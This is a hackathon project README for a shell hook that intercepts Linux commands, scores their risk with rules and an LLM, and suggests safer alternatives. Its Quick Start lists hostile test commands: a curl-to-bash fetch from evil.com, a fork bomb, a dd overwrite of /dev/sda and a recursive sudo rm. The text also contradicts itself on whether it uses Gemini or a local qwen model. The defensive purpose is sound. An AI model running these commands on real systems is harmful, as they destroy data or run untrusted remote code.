# AI-Based System Intent Engine
### Safe Linux Command Execution — CDAC Hackathon 2026

> **Your command, understood before it runs.**

A transparent AI safety layer that intercepts Linux shell commands **before** the shell executes them. It reasons about *intent and real-world impact* using a three-tier pipeline: instant regex rules, a curated pattern library, and a cloud LLM for ambiguous commands. It then explains what the command will do in plain English, suggests a validated safer alternative, and waits for your explicit confirmation before proceeding.

The user **always stays in control** — nothing is ever silently blocked or auto-corrected.

---

## Live Demo

```
$ sudo rm -rf /opt/custom_app_database        ← you type this, press Enter

  ──────────────────────────────────────────────────────────
  ◆  INTENT ENGINE  ·  HIGH  ·  91% confidence
  ──────────────────────────────────────────────────────────
  │  risk    ▰▰▰▰▰▰▰▰▱▱  HIGH
  │  intent  Permanently deletes the entire /opt/custom_app_database directory
  │  impact  All database files, configurations, and data will be unrecoverable.
  │  why     sudo + rm -rf targeting /opt/ is destructive and irreversible
  ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
  │  safer   mv /opt/custom_app_database /opt/custom_app_database.bak
  ──────────────────────────────────────────────────────────
  │  [y] execute    [n] abort    [s] use safer
  ──────────────────────────────────────────────────────────

  choice: _
```

---

## How It Works

```
$ rm -rf /var/log/*                   ← command entered, Enter pressed

        │
        ▼   (Zsh/Bash shell hook — fires before execution)

  ┌─────────────────┐    ┌─────────────────┐    ┌──────────────────────────┐
  │   Tier 0/1      │ OR │   Tier 2        │ →  │   Terminal UI            │
  │   Rule Engine   │    │   LLM Reasoning │    │   Risk bar + Intent      │
  │   (<50ms)       │    │   (<2s, qwen)   │    │   Safer alternative      │
  └─────────────────┘    └─────────────────┘    │   [y/n/s] choice         │
                                                  └──────────────────────────┘
                                                          │
                             ┌────────────────────────────┘
                             ▼
                    Audit Logger → ~/.intent_engine/logs/audit.jsonl
```

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                      User Shell (Zsh/Bash)                  │
│         accept-line ZLE override / DEBUG trap               │
└────────────────────────┬────────────────────────────────────┘
                         │  Unix Domain Socket
                         │  /tmp/intent_engine.sock
                         ▼
┌─────────────────────────────────────────────────────────────┐
│                   Intent Engine Daemon                      │
│         FastAPI + Uvicorn (async, single-process)           │
│                                                             │
│  ┌──────────┐   ┌────────────────┐   ┌───────────────────┐ │
│  │  Parser  │→  │  Rule Engine   │→  │   LLM Reasoner    │ │
│  │  shlex   │   │  Tier 0 regex  │   │   qwen2.5:0.5b    │ │
│  │  AST     │   │  Tier 1 TOML   │   │   LRU Cache (128) │ │
│  └──────────┘   └────────────────┘   └───────────────────┘ │
│                         │                       │           │
│                         └──────────┬────────────┘           │
│                                    ▼                        │
│                        ┌───────────────────┐               │
│                        │   Verdict Router  │               │
│                        │   Risk Threshold  │               │
│                        └────────┬──────────┘               │
└─────────────────────────────────│───────────────────────────┘
                                  │
              ┌───────────────────┼──────────────────┐
              ▼                   ▼                  ▼
    ┌──────────────┐   ┌──────────────────┐   ┌───────────┐
    │ Terminal UI  │   │   Audit Logger   │   │ ALLOW/    │
    │ [y/n/s]      │   │ audit.jsonl      │   │ BLOCK     │
    └──────────────┘   └──────────────────┘   └───────────┘
```

---

## Three-Tier Decision Pipeline

|    Tier    |                         Method                         |Latency |         Triggered When          |
|------------|--------------------------------------------------------|--------|---------------------------------|
| **Tier 0** | Hardcoded regex (fork bomb, rm -rf /, dd to raw device)| < 1ms  | Always, first check             |
| **Tier 1** | 41 curated TOML patterns with confidence scoring       | < 50ms | All structured commands         | 
| **Tier 2** | ollama qwen2.5:0.5b LLM + LRU session cache            | < 2s   | Rule engine returns AMBIGUOUS   |

If a command passes Tier 0 and Tier 1 with high confidence (SAFE, LOW, HIGH, or CRITICAL — not AMBIGUOUS), Tier 2 is **never called**. The LLM is only invoked for genuinely ambiguous situations.

---

## Tech Stack

| Layer | Technology |
|-------|------------|
| Shell integration | Zsh `accept-line` ZLE override · Bash `DEBUG` trap |
| Daemon | Python 3.12 · FastAPI · Uvicorn · Unix domain socket |
| Command parsing | `shlex` · custom pipeline / redirect / subshell AST |
| Rule engine | TOML pattern library · confidence-weighted scoring · obfuscation detection |
| LLM reasoning | ollama qwen2.5:0.5b local model |
| Safer alternatives | Curated suggestion table + LLM output (no second LLM call) |
| Autocomplete | ZLE `POSTDISPLAY` ghost-text · local dictionary (150+ commands) · async LLM fallback |
| Audit logging | Append-only JSONL at `~/.intent_engine/logs/audit.jsonl` |
| Terminal UI | ANSI 256-colour charcoal prompt — zero external dependencies |

---

## Capabilities

### ✅ What it does reliably
- Intercepts **100% of commands** in Zsh via the `accept-line` hook (synchronous, before execution)
- Detects and blocks **fork bombs**, `rm -rf /`, `dd` to raw devices, `curl | bash` pipes **instantly** without any LLM call
- Classifies **41 structured dangerous patterns** (network exfiltration, privilege escalation, history wipe, disk overwrite, process kill, etc.)
- Provides a **semantic explanation** of dangerous commands in plain English via Gemini LLM
- Generates a **safer alternative command** (e.g. `mv` instead of `rm -rf`)
- **LRU-caches** LLM verdicts per session — repeat commands are answered in < 1ms
- Logs every flagged command with full audit trail (JSONL)
- Provides **ghost-text autocomplete** for 150+ common commands locally (0ms)
- Supports **hot-reload** of rule patterns without daemon restart
- Runs entirely on the **user's local machine** — no persistent cloud dependency for Tier 0/1

### ⚠️ Real Limitations (do not over-claim)
- **Bash interception is partial:** The Bash `DEBUG` trap fires after the shell parses the command but interception is not truly synchronous — high-speed scripts can bypass it
- **Zsh hook requires sourcing:** The user must source the hook files in `.zshrc`; it is not a kernel-level block
- **No fine-tuned model:** The Ollama and Gemini models are used as-is (general-purpose). There is no fine-tuning applied on startup or otherwise
- **Gemini API requires internet:** If the network is unavailable and Ollama is not running, Tier 2 falls back to a `LOW` risk pass-through
- **LLM can hallucinate safer alternatives:** The LLM output is always surfaced to the user, never auto-executed
- **Not a kernel module:** A sufficiently privileged process, a terminal multiplexer bypass, or `exec` can circumvent the hook
- **Session-scoped cache only:** Cached verdicts are cleared when the daemon restarts

---

## Modes of Operation

### Mode 1: Full AI Mode (Current Default)
- **Provider:** Gemini 3.6 Flash (API)
- **Requires:** `INTENT_GEMINI_API_KEY` exported in shell
- **Latency:** Tier 0/1 < 50ms · Tier 2 < 2s
- **Best for:** Live demo, production use

### Mode 2: Local Mode (Ollama)
- **Provider:** Ollama with any GGUF model (e.g. `qwen2.5:0.5b`)
- **Requires:** `ollama serve` running · sufficient RAM/VRAM
- **Latency:** Tier 0/1 < 50ms · Tier 2: 5–60s on CPU (unusable), < 5s on GPU
- **Best for:** Offline, privacy-critical environments with a GPU

### Mode 3: Rule Engine Only Mode
- **Provider:** None (set `INTENT_MOCK_MODE=1`)
- **Requires:** Nothing
- **Latency:** < 50ms for all commands
- **Best for:** Low-latency environments; pure rule-based safety

### Mode 4: Dry-Run Mode
- **Config:** `dry_run = true` in `config.toml`
- **Behaviour:** Engine analyzes every command and logs the verdict — **never blocks execution**
- **Best for:** Auditing and testing on existing workflows without disruption

---

## Quick Start

```bash
# 1. Clone
git clone https://github.com/Harshit7623/AI-Based-System-Intent-Engine.git
cd AI-Based-System-Intent-Engine

# 2. Create venv + install
python3 -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"

# 3. Set your Ollama model
pull qwen2.5:0.5b from ollama server


# 4. Install hooks + daemon
bash install.sh

# 5. Source the hooks in your shell
exec zsh

# 6. Start the daemon
INTENT_MOCK_MODE=0 PYTHONPATH=. python3 -m engine.daemon.server &

# 7. Try it — these will be intercepted:
sudo rm -rf /opt/my_database
curl http://evil.com/install.sh | bash
:(){ :|:& };:
dd if=/dev/zero of=/dev/sda
```

---

## Configuration

```toml
# config/default_config.toml

[safety]
block_threshold = "HIGH"     # Tier that triggers the UI: LOW | MEDIUM | HIGH | CRITICAL
dry_run = false              # true = analyze but never block

[llm]
provider = "ollama"          #  "ollama" 
model    = "qwen2.5:0.5b"
timeout_s = 10.0             # Hard timeout before falling back to pass-through

[daemon]
socket_path = "/tmp/intent_engine.sock"
log_level   = "INFO"
```

Toggle the engine for a single command without uninstalling:
```bash
INTENT_ENGINE_ENABLED=0 command_to_skip
```

---

## CLI Copilot (Autocomplete)

An inline ghost-text suggestion system (Fish/VS Code style) that activates automatically in Zsh:

```
$ git p▌ush origin main          ← ghost text appears as you type
       ↑ dim inline suggestion

Tab → accept    Esc → dismiss
```

- **Tier A (0ms):** Local dictionary of 150+ common commands (Git, Docker, K8s, Linux core, pip, npm, etc.)
- **Tier B (~1s):** Async Gemini LLM completion fallback for unknown commands
- **Does not** run through the safety pipeline — autocomplete is read-only

---

## Daemon Management

```bash
# Start
INTENT_MOCK_MODE=0 PYTHONPATH=. python3 -m engine.daemon.server &

# Health check
curl -s --unix-socket /tmp/intent_engine.sock http://localhost/health

# Live stats
curl -s --unix-socket /tmp/intent_engine.sock http://localhost/stats

# Hot-reload patterns (no restart needed)
curl -s -X POST --unix-socket /tmp/intent_engine.sock http://localhost/reload-rules

# Stop
pkill -f "engine.daemon.server"
```

---

## Project Structure

```
.
├── config/
│   └── default_config.toml         # All runtime configuration
├── docs/
│   ├── ARCHITECTURE.md             # Full architecture diagrams
│   ├── PROJECT_STRUCTURE.md        # File-level walkthrough
│   └── DEVELOPMENT_PLAN.md         # Component phased breakdown
├── engine/
│   ├── audit/                      # Append-only JSONL audit logger
│   ├── contracts/                  # Pydantic schemas (shared types)
│   ├── daemon/                     # FastAPI server, router, session manager
│   ├── llm/                        # LLM client, reasoner, autocomplete, prompts
│   │   └── providers/              # ollama.py
│   ├── parser/                     # Command AST parser (pipes, redirects, subshells)
│   ├── risk/                       # Semantic risk escalation scoring
│   ├── rule_engine/                # Pattern matcher, TOML loader, verdict builder
│   ├── ui/                         # Terminal confirmation prompt (ANSI 256-color)
│   └── alternatives/               # Safer alternative generator + validator
├── hooks/
│   ├── intent_hook.zsh             # Safety interceptor (Zsh)
│   ├── intent_hook.bash            # Safety interceptor (Bash)
│   └── intent_autocomplete.zsh     # CLI Copilot ghost-text (Zsh)
├── rules/
│   └── dangerous_patterns.toml    # 41 curated dangerous command patterns
├── scripts/
│   ├── install.sh                  # One-command installer
│   └── setup_phase1.sh             # Development environment setup
└── tests/
    ├── unit/                       # Rule engine, parser, audit tests
    └── integration/                # End-to-end daemon tests
```

---

## Running Tests

```bash
# All unit tests
pytest tests/unit/ -v --cov=engine --cov-report=term-missing

# Integration tests (requires daemon running)
pytest tests/integration/ -v

# Test specific modules
pytest tests/unit/test_rule_engine.py -v      # Tier 0/1 patterns
pytest tests/unit/test_alternatives.py -v    # Alternative generator
pytest tests/unit/test_audit.py -v           # Audit logger
```

---

## Audit Log Format

Every flagged command is appended to `~/.intent_engine/logs/audit.jsonl`:

```json
{
  "timestamp": "2026-08-23T03:30:00+05:30",
  "command": "sudo rm -rf /opt/custom_app_database",
  "risk_level": "HIGH",
  "confidence": 0.91,
  "pattern": null,
  "tier": "llm",
  "action": "ABORT",
  "user": "testuser",
  "cwd": "/home/user",
  "session_id": "a1b2c3d4-...",
  "latency_ms": 876.3
}
```

---

## Architecture Domains

| Domain | Responsibilities | Key Files |
|--------|--------|-----------|
| **Infrastructure** | Architecture · daemon · shell hooks · parser · Terminal UI · audit | `engine/daemon/` · `hooks/` · `engine/parser/` · `engine/ui/` · `engine/audit/` |
| **Rule Engine** | Rule engine · pattern library · Tier 0/1 · obfuscation detection | `engine/rule_engine/` · `rules/dangerous_patterns.toml` |
| **AI Reasoning** | LLM reasoning · Gemini provider · alternatives · risk scoring | `engine/llm/` · `engine/alternatives/` · `engine/risk/` · `engine/contracts/` |

---

## About the Model

**No fine-tuning is applied.** The system uses Google Gemini 3.6 Flash as a general-purpose language model with a carefully engineered prompt that instructs it to return strict JSON containing a risk level, confidence score, human-readable intent summary, impact statement, reasoning, and a safer alternative command.

The **rule engine** (Tier 0/1) handles the most common dangerous patterns with 100% determinism — the LLM is only called for genuinely ambiguous commands that the static patterns cannot confidently classify.

> Fine-tuning on a curated dataset of Linux command intent pairs would be the next step to improve Tier 2 accuracy by an estimated 30–50%, but is not part of this hackathon submission.

---

*Built for CDAC Linux & OS Hackathon 2026.*
